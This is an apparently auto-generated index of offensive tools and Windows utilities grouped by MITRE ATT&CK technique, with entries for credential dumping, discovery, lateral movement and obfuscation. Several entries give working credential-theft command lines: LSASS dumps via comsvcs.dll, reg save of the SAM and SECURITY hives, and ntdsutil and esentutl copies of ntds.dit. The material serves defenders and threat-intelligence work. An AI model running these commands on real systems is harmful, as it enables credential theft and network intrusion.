---
parsed_by: focuslocust
source: indexes
type: generated
---
# Tools by Technique

[Home](../../README.md)

## T1001 - Data Obfuscation

- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can modify the Origin and Referrer fields in HTTPS headers it relays between intended victims and legitimate websites to comply with cross-origin resource sharing (CORS) restrictions.(Citation: Evilginx 2 July 2018)

## T1001.002 - Steganography

- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can encode binary data into a .PNG file for C2 communication.(Citation: GitHub Sliver HTTP)

## T1003 - OS Credential Dumping

- [Createdump.exe](../tools/windows/createdump.exe.md) — explicit, source. Command metadata lists T1003: createdump.exe -n -f {PATH:.dmp} {PID}
- [Rpcping.exe](../tools/windows/rpcping.exe.md) — explicit, source. Command metadata lists T1003: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
- [Sqldumper.exe](../tools/windows/sqldumper.exe.md) — explicit, source. Command metadata lists T1003: sqldumper.exe 464 0 0x0110
- [Tttracer.exe](../tools/windows/tttracer.exe.md) — explicit, source. Command metadata lists T1003: TTTracer.exe -dumpFull -attach {PID}
- [rdrleakdiag.exe](../tools/windows/rdrleakdiag.exe.md) — explicit, source. Command metadata lists T1003: rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1

## T1003.001 - LSASS Memory

- [Comsvcs.dll](../tools/windows/comsvcs.dll.md) — explicit, source. Command metadata lists T1003.001: rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
- [Dump64.exe](../tools/windows/dump64.exe.md) — explicit, source. Command metadata lists T1003.001: dump64.exe {PID} out.dmp
- [DumpMinitool.exe](../tools/windows/dumpminitool.exe.md) — explicit, source. Command metadata lists T1003.001: DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains an implementation of [Mimikatz](https://attack.mitre.org/software/S0002) to gather credentials from memory.(Citation: Github PowerShell Empire)
- [Impacket](../tools/unknown/impacket.md) — explicit, source. SecretsDump and [Mimikatz](https://attack.mitre.org/software/S0002) modules within [Impacket](https://attack.mitre.org/software/S0357) can perform credential dumping to obtain account and password information.(Citation: Impacket Tools)
- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can perform credential dumping from memory to obtain account and password information.(Citation: GitHub LaZagne Dec 2018)
- [Lslsass](../tools/unknown/lslsass.md) — explicit, source. [Lslsass](https://attack.mitre.org/software/S0121) can dump active logon session password hashes from the lsass process.(Citation: Mandiant APT1)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015)(Citation: NCSC Joint Report Public Tools)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains an implementation of [Mimikatz](https://attack.mitre.org/software/S0002) to gather credentials from memory.(Citation: GitHub PoshC2)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Exfiltration modules that can harvest credentials using [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can execute Lazagne as well as [Mimikatz](https://attack.mitre.org/software/S0002) using PowerShell.(Citation: GitHub Pupy)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can create a memory dump of LSASS via the `MiniDumpWriteDump Win32` API call.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) has a built-in `procdump` command allowing for retrieval of memory from processes such as `lsass.exe` for credential harvesting.(Citation: Cybereason Sliver Undated)
- [Sqldumper.exe](../tools/windows/sqldumper.exe.md) — explicit, source. Command metadata lists T1003.001: sqldumper.exe 540 0 0x01100:40
- [Windows Credential Editor](../tools/unknown/windows-credential-editor.md) — explicit, source. [Windows Credential Editor](https://attack.mitre.org/software/S0005) can dump credentials.(Citation: Amplia WCE)
- [adplus.exe](../tools/windows/adplus.exe.md) — explicit, source. Command metadata lists T1003.001: adplus.exe -c {PATH:.xml}
- [rdrleakdiag.exe](../tools/windows/rdrleakdiag.exe.md) — explicit, source. Command metadata lists T1003.001: rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap

## T1003.002 - Security Account Manager

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can dump usernames and hashed passwords from the SAM.(Citation: CME Github September 2018)
- [Fgdump](../tools/unknown/fgdump.md) — explicit, source. [Fgdump](https://attack.mitre.org/software/S0120) can dump Windows password hashes.(Citation: Mandiant APT1)
- [Impacket](../tools/unknown/impacket.md) — explicit, source. SecretsDump and [Mimikatz](https://attack.mitre.org/software/S0002) modules within [Impacket](https://attack.mitre.org/software/S0357) can perform credential dumping to obtain account and password information.(Citation: Impacket Tools)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can gather hashed passwords by dumping SAM/SECURITY hive.(Citation: Github Koadic)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015)(Citation: NCSC Joint Report Public Tools)
- [Reg.exe](../tools/windows/reg.exe.md) — explicit, source. Command metadata lists T1003.002: reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
- [gsecdump](../tools/unknown/gsecdump.md) — explicit, source. [gsecdump](https://attack.mitre.org/software/S0008) can dump Windows password hashes from the SAM.(Citation: Microsoft Gsecdump)
- [pwdump](../tools/unknown/pwdump.md) — explicit, source. [pwdump](https://attack.mitre.org/software/S0006) can be used to dump credentials from the SAM.(Citation: Wikipedia pwdump)

## T1003.003 - NTDS

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy.(Citation: CME Github September 2018)
- [Diskshadow.exe](../tools/windows/diskshadow.exe.md) — explicit, source. Command metadata lists T1003.003: diskshadow.exe /s {PATH:.txt}
- [Esentutl.exe](../tools/windows/esentutl.exe.md) — explicit, source. Command metadata lists T1003.003: esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit}
- [Impacket](../tools/unknown/impacket.md) — explicit, source. SecretsDump and [Mimikatz](https://attack.mitre.org/software/S0002) modules within [Impacket](https://attack.mitre.org/software/S0357) can perform credential dumping to obtain account and password information from NTDS.dit.(Citation: Impacket Tools)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can gather hashed passwords by gathering domain controller hashes from NTDS.(Citation: Github Koadic)
- [dsdbutil.exe](../tools/windows/dsdbutil.exe.md) — explicit, source. Command metadata lists T1003.003: dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
- [esentutl](../tools/unknown/esentutl.md) — explicit, source. [esentutl](https://attack.mitre.org/software/S0404) can copy `ntds.dit` using the Volume Shadow Copy service.(Citation: LOLBAS Esentutl)(Citation: Cary Esentutl)
- [ntdsutil.exe](../tools/windows/ntdsutil.exe.md) — explicit, source. Command metadata lists T1003.003: ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
- [wbadmin.exe](../tools/windows/wbadmin.exe.md) — explicit, source. Command metadata lists T1003.003: wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notR...

## T1003.004 - LSA Secrets

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can dump secrets from the Local Security Authority.(Citation: AADInternals Documentation)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can dump hashed passwords from LSA secrets for the targeted system.(Citation: CME Github September 2018)
- [Impacket](../tools/unknown/impacket.md) — explicit, source. SecretsDump and [Mimikatz](https://attack.mitre.org/software/S0002) modules within [Impacket](https://attack.mitre.org/software/S0357) can perform credential dumping to obtain account and password information.(Citation: Impacket Tools)
- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can perform credential dumping from LSA secrets to obtain account and password information.(Citation: GitHub LaZagne Dec 2018)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015)(Citation: NCSC Joint Report Public Tools)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can use Lazagne for harvesting credentials.(Citation: GitHub Pupy)
- [gsecdump](../tools/unknown/gsecdump.md) — explicit, source. [gsecdump](https://attack.mitre.org/software/S0008) can dump LSA secrets.(Citation: TrueSec Gsecdump)

## T1003.005 - Cached Domain Credentials

- [Cachedump](../tools/unknown/cachedump.md) — explicit, source. [Cachedump](https://attack.mitre.org/software/S0119) can extract cached password hashes from cache entry information.(Citation: Mandiant APT1)
- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can perform credential dumping from MSCache to obtain account and password information.(Citation: GitHub LaZagne Dec 2018)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can use Lazagne for harvesting credentials.(Citation: GitHub Pupy)

## T1003.006 - DCSync

- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015)(Citation: NCSC Joint Report Public Tools)(Citation: Cobalt Strike Manual 4.3 November 2020)

## T1003.007 - Proc Filesystem

- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can use the `<PID>/maps` and `<PID>/mem` files to identify regex patterns to dump cleartext passwords from the browser's process memory.(Citation: GitHub LaZagne Dec 2018)(Citation: Picus Labs Proc cump 2022)
- [MimiPenguin](../tools/unknown/mimipenguin.md) — explicit, source. [MimiPenguin](https://attack.mitre.org/software/S0179) can use the `<PID>/maps` and `<PID>/mem` file to search for regex patterns and dump the process memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Picus Labs Proc cump 2022)

## T1003.008 - ／etc／passwd and ／etc／shadow

- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can obtain credential information from /etc/shadow using the shadow.py module.(Citation: GitHub LaZagne Dec 2018)

## T1005 - Data from Local System

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. 
[Brute Ratel C4](https://attack.mitre.org/software/S1063) has the ability to upload files from a compromised system.(Citation: Palo Alto Brute Ratel July 2022)
- [Forfiles](../tools/unknown/forfiles.md) — explicit, source. [Forfiles](https://attack.mitre.org/software/S0193) can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).(Citation: Überwachung APT28 Forfiles June 2015)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can download files off the target system to send back to the server.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021)
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) has the ability to upload files from an infected device.(Citation: Secureworks MCMD July 2019)
- [NPPSPY](../tools/unknown/nppspy.md) — explicit, source. [NPPSPY](https://attack.mitre.org/software/S1131) records data entered from the local system logon at Winlogon to capture credentials in cleartext.(Citation: Huntress NPPSPY 2022)
- [Out1](../tools/unknown/out1.md) — explicit, source. [Out1](https://attack.mitre.org/software/S0594) can copy files and Registry data from compromised hosts.(Citation: Trend Micro Muddy Water March 2021)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can collect files and information from a compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can retrieve files from compromised client machines.(Citation: CISA AR18-352A Quasar RAT December 2018)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has gathered data from home directories of the victim environment.(Citation: Netskope Shai-Hulud November 2025)
- [Wevtutil](../tools/unknown/wevtutil.md) — explicit, source. [Wevtutil](https://attack.mitre.org/software/S0645) can be used to export events from a specific log.(Citation: Wevtutil Microsoft Documentation)(Citation: F-Secure Lazarus Cryptocurrency Aug 2020)
- [esentutl](../tools/unknown/esentutl.md) — explicit, source. [esentutl](https://attack.mitre.org/software/S0404) can be used to collect data from local file systems.(Citation: Red Canary 2021 Threat Detection Report March 2021)

## T1006 - Direct Volume Access

- [esentutl](../tools/unknown/esentutl.md) — explicit, source. [esentutl](https://attack.mitre.org/software/S0404) can use the Volume Shadow Copy service to copy locked files such as `ntds.dit`.(Citation: LOLBAS Esentutl)(Citation: Cary Esentutl)

## T1007 - System Service Discovery

- [Net](../tools/unknown/net.md) — explicit, source. The <code>net start</code> command can be used in [Net](https://attack.mitre.org/software/S0039) to find information about Windows services.(Citation: Savill 1999)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can enumerate service and service permission information.(Citation: GitHub PoshC2)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can search for modifiable services that could be used for privilege escalation.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [Tasklist](../tools/unknown/tasklist.md) — explicit, source. [Tasklist](https://attack.mitre.org/software/S0057) can be used to discover services running on a system.(Citation: Microsoft Tasklist)

## T1008 - Fallback Channels

- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) can use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked.(Citation: Mythc Documentation)	

## T1010 - Application Window Discovery

- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [APT-C-36](https://attack.mitre.org/groups/G0099) used a customized version of [QuasarRAT](https://attack.mitre.org/software/S0262) to monitor browser windows for strings relating to specific Colombian financial institutions.(Citation: Kaspersky BlindEagle AUG 2024)

- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can list all windows on victim systems.(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can enumerate the active Window during keylogging through execution of `GetActiveWindowTitle`.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1012 - Query Registry

- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can search the registry files of a compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Reg](../tools/unknown/reg.md) — explicit, source. [Reg](https://attack.mitre.org/software/S0075) may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.(Citation: Microsoft Reg)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can obtain Registry data from targeted systems.(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can use the `GetRegValue` function to check Registry keys within `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1014 - Rootkit

- [HTRAN](../tools/unknown/htran.md) — explicit, source. [HTRAN](https://attack.mitre.org/software/S0040) can install a rootkit to hide network connections from the host OS.(Citation: NCSC Joint Report Public Tools)

## T1016 - System Network Configuration Discovery

- [AdFind](../tools/unknown/adfind.md) — explicit, source. [AdFind](https://attack.mitre.org/software/S0552) can extract subnet information from Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)
- [Arp](../tools/unknown/arp.md) — explicit, source. [Arp](https://attack.mitre.org/software/S0099) can be used to display ARP configuration information on the host.(Citation: TechNet Arp)
- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can enumerate the NetBIOS name on targeted machines.(Citation: ESET MirrorFace 2025)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can collect DNS information from the targeted system.(Citation: CME Github September 2018)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can acquire network configuration information like DNS servers, public IP, and network proxies used by a host.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can retrieve the contents of the IP routing table as well as information about the Windows domain.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021)
- [NBTscan](../tools/unknown/nbtscan.md) — explicit, source. [NBTscan](https://attack.mitre.org/software/S0590) can be used to collect MAC addresses.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	
- [Nltest](../tools/unknown/nltest.md) — explicit, source. [Nltest](https://attack.mitre.org/software/S0359) may be used to enumerate the parent domain of a local machine using <code>/parentdomain</code>.(Citation: Nltest Manual)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can obtain the proxy settings of a compromised machine using `InternetQueryOptionA` and its IP address by running `nslookup myip.opendns.comresolver1.opendns.com\r\n`.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can enumerate network adapter information.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string `Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0`.(Citation: CISA AR18-352A Quasar RAT December 2018)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.(Citation: FOX-IT May 2016 Mofang)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) has the ability to gather network configuration information.(Citation: GitHub Sliver Ifconfig)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can capture information from each session with a victim including the public IP used to access the server and the user agent.(Citation: Sophos Evilginx MAR 2025)
- [ifconfig](../tools/unknown/ifconfig.md) — explicit, source. [ifconfig](https://attack.mitre.org/software/S0101) can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.
- [ipconfig](../tools/unknown/ipconfig.md) — explicit, source. [ipconfig](https://attack.mitre.org/software/S0100) can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.
- [nbtstat](../tools/unknown/nbtstat.md) — explicit, source. [nbtstat](https://attack.mitre.org/software/S0102) can be used to discover local NetBIOS domain names.
- [route](../tools/unknown/route.md) — explicit, source. [route](https://attack.mitre.org/software/S0103) can be used to discover routing configuration information.

## T1018 - Remote System Discovery

- [AdFind](../tools/unknown/adfind.md) — explicit, source. [AdFind](https://attack.mitre.org/software/S0552) has the ability to query Active Directory for computers.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: Cybereason Bumblebee August 2022)
- [Arp](../tools/unknown/arp.md) — explicit, source. [Arp](https://attack.mitre.org/software/S0099) can be used to display a host's ARP cache, which may include address resolutions for remote systems.(Citation: TechNet Arp)(Citation: Palo Alto ARP)
- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can enumerate and collect the properties of domain computers, including domain controllers.(Citation: CrowdStrike BloodHound April 2018)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can discover active IP addresses, along with the machine name, within a targeted network.(Citation: CME Github September 2018)
- [NBTscan](../tools/unknown/nbtscan.md) — explicit, source. [NBTscan](https://attack.mitre.org/software/S0590) can list NetBIOS computer names.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	
- [Net](../tools/unknown/net.md) — explicit, source. Commands such as <code>net view</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about available remote systems.(Citation: Savill 1999)
- [Nltest](../tools/unknown/nltest.md) — explicit, source. [Nltest](https://attack.mitre.org/software/S0359) may be used to enumerate remote domain controllers using options such as <code>/dclist</code> and <code>/dsgetdc</code>.(Citation: Nltest Manual)
- [Ping](../tools/unknown/ping.md) — explicit, source. [Ping](https://attack.mitre.org/software/S0097) can be used to identify remote systems within a network.(Citation: TechNet Ping)
- [ROADTools](../tools/unknown/roadtools.md) — explicit, source. [ROADTools](https://attack.mitre.org/software/S0684) can enumerate Azure AD systems and devices.(Citation: Roadtools)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can enumerate and collect the properties of domain computers.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1020 - Automated Exfiltration

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has the ability to automatically send collected data back to the threat actors' C2.(Citation: Talos Frankenstein June 2019)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) sent collected system and network information compiled into a report to an adversary-controlled C2.(Citation: FOX-IT May 2016 Mofang)

## T1021 - Remote Services

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has the ability to use RPC for lateral movement.(Citation: Palo Alto Brute Ratel July 2022)

## T1021.001 - Remote Desktop Protocol

- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a module for performing remote desktop access.(Citation: QiAnXin APT-C-36 Feb2019)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can enable remote desktop on the victim's machine.(Citation: Github Koadic)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) has a module for performing remote desktop access.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)

## T1021.002 - SMB／Windows Admin Shares

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has the ability to use SMB to pivot in compromised networks.(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)(Citation: Dark Vortex Brute Ratel C4)
- [Net](../tools/unknown/net.md) — explicit, source. Lateral movement can be done with [Net](https://attack.mitre.org/software/S0039) through <code>net use</code> commands to connect to the on remote systems.(Citation: Savill 1999)
- [PsExec](../tools/unknown/psexec.md) — explicit, source. [PsExec](https://attack.mitre.org/software/S0029), a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.(Citation: PsExec Russinovich)

## T1021.003 - Distributed Component Object Model

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can utilize <code>Invoke-DCOM</code> to leverage remote COM execution for lateral movement.(Citation: Github PowerShell Empire)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can use `System` namespace methods to execute lateral movement using DCOM.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1021.004 - SSH

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains modules for executing commands over SSH as well as in-memory VNC agent injection.(Citation: Github PowerShell Empire)

## T1021.006 - Windows Remote Management

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use WinRM for pivoting.(Citation: Palo Alto Brute Ratel July 2022)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) tracks `TrustedHosts` and can move laterally to these targets via WinRM.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1027 - Obfuscated Files or Information

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has used encrypted payload files and maintains an encrypted configuration structure in memory.(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)
- [CARROTBALL](../tools/unknown/carrotball.md) — explicit, source. [CARROTBALL](https://attack.mitre.org/software/S0465) has used a custom base64 alphabet to decode files.(Citation: Unit 42 CARROTBAT January 2020)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.(Citation: QiAnXin APT-C-36 Feb2019)
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) can Base64 encode output strings prior to sending to C2.(Citation: Secureworks MCMD July 2019)
- [Out1](../tools/unknown/out1.md) — explicit, source. [Out1](https://attack.mitre.org/software/S0594) has the ability to encode data.(Citation: Trend Micro Muddy Water March 2021)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) uses RC4 and base64 to obfuscate data, including Registry entries and file paths.(Citation: Talos Remcos Aug 2018) [Remcos](https://attack.mitre.org/software/S0332) can also employ control flow flattening to hinder analysis.(Citation: Check Point Blind Eagle MAR 2025)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) encrypted gathered information with a combination of shifting and XOR using a static key.(Citation: FOX-IT May 2016 Mofang)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) obfuscates configuration and other static files using native Go libraries such as `garble` and `gobfuscate` to inhibit configuration analysis and static detection.(Citation: Microsoft Sliver 2022)

## T1027.002 - Software Packing

- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) has been packed with UPX.(Citation: Cybereason Kimsuky November 2020)
